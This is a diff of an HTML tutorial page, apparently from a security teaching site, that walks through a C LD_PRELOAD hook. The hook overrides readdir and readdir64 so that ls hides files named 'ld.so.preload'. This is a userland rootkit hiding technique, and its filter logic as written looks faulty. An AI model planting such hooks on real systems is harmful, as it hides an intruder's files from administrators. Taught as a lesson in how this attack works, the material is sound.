+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">char</span>           d_name[<span style="color:#ae81ff">256</span>]; <span style="color:#75715e">/* Null-terminated filename */</span>
+</span></span><span style="display:flex;"><span>     };
+</span></span></code></pre></div><p>The main parameter which we are concerned about here is the <code>d_name[256]</code> which is a mandatory field and contains the name of the various files in our a directory. (See where I am going with this ?)</p>
 <p>So here&rsquo;s the roadmap:</p>
 <ul>
 <li><code>ls</code> uses <code>readdir()</code> function to get the contents of a directory</li>
@@ -559,37 +577,37 @@ data-ad-slot="7160066188"></ins></p>
 <li>If yes, we skip it and pass on the rest.</li>
 </ul>
 <p>With the map all set, let&rsquo;s get to coding!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define FILENAME &#34;ld.so.preload&#34;
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span><span style="color:#a6e22e">readdir</span>(DIR <span style="color:#f92672">*</span>dirp)
-{
-     <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>old_readdir)(DIR <span style="color:#f92672">*</span>dir);     
-     old_readdir <span style="color:#f92672">=</span> dlsym(RTLD_NEXT, <span style="color:#e6db74">&#34;readdir&#34;</span>);
-     <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>dir;
-     <span style="color:#66d9ef">while</span> (dir <span style="color:#f92672">=</span> old_readdir(dirp))
-     {
-           <span style="color:#66d9ef">if</span>(strstr(dir<span style="color:#f92672">-&gt;</span>d_name,FILENAME) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;     
-     }
-     <span style="color:#66d9ef">return</span> dir;
-}
-
-<span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span><span style="color:#a6e22e">readdir64</span>(DIR <span style="color:#f92672">*</span>dirp)
-{
-     <span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>old_readdir64)(DIR <span style="color:#f92672">*</span>dir);     
-     old_readdir64 <span style="color:#f92672">=</span> dlsym(RTLD_NEXT, <span style="color:#e6db74">&#34;readdir64&#34;</span>);
-     <span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span>dir;
-     <span style="color:#66d9ef">while</span> (dir <span style="color:#f92672">=</span> old_readdir64(dirp))
-     {
-           <span style="color:#66d9ef">if</span>(strstr(dir<span style="color:#f92672">-&gt;</span>d_name,FILENAME) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
-     }
-     <span style="color:#66d9ef">return</span> dir;
-}
-</code></pre></div><p><em>[Note : The readdir64 is just the 64-bit version of the same and follows the same concepts so don&rsquo;t worry about it !]</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define FILENAME &#34;ld.so.preload&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span><span style="color:#a6e22e">readdir</span>(DIR <span style="color:#f92672">*</span>dirp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>old_readdir)(DIR <span style="color:#f92672">*</span>dir);     
+</span></span><span style="display:flex;"><span>     old_readdir <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(RTLD_NEXT, <span style="color:#e6db74">&#34;readdir&#34;</span>);
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>dir;
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">while</span> (dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">old_readdir</span>(dirp))
+</span></span><span style="display:flex;"><span>     {
+</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strstr</span>(dir<span style="color:#f92672">-&gt;</span>d_name,FILENAME) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;     
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> dir;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span><span style="color:#a6e22e">readdir64</span>(DIR <span style="color:#f92672">*</span>dirp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>old_readdir64)(DIR <span style="color:#f92672">*</span>dir);     
+</span></span><span style="display:flex;"><span>     old_readdir64 <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(RTLD_NEXT, <span style="color:#e6db74">&#34;readdir64&#34;</span>);
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">struct</span> dirent64 <span style="color:#f92672">*</span>dir;
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">while</span> (dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">old_readdir64</span>(dirp))
+</span></span><span style="display:flex;"><span>     {
+</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strstr</span>(dir<span style="color:#f92672">-&gt;</span>d_name,FILENAME) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> dir;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>[Note : The readdir64 is just the 64-bit version of the same and follows the same concepts so don&rsquo;t worry about it !]</em></p>
 <p>Breaking down our hook, we have:</p>
 <ul>
 <li>First we declare our usual headers with the extra <code>#include &lt;dirent.h&gt;</code> header which contains the definition of the <code>dirent</code> structure</li>
@@ -633,7 +651,7 @@ data-ad-slot="7160066188"></ins></p>
 
             <footer class="ui basic center aligned segment" style="background-color: transparent;">
               
-              <p>© 2010 - 2023 Classroom</p>
+              <p>© 2010 - 2025 Classroom</p>
               
 
               
@@ -844,7 +862,7 @@ data-ad-slot="7160066188"></ins></p>
 </div>
 <script>
   $(document).ready(function () {
-    $.getJSON('https:\/\/classroom.anir0y.in/index.json', function (data) {
+    $.getJSON('http:\/\/localhost:1313\//index.json', function (data) {
       $('.ui.search').search({
         source: data,
         searchFields: ['title'],
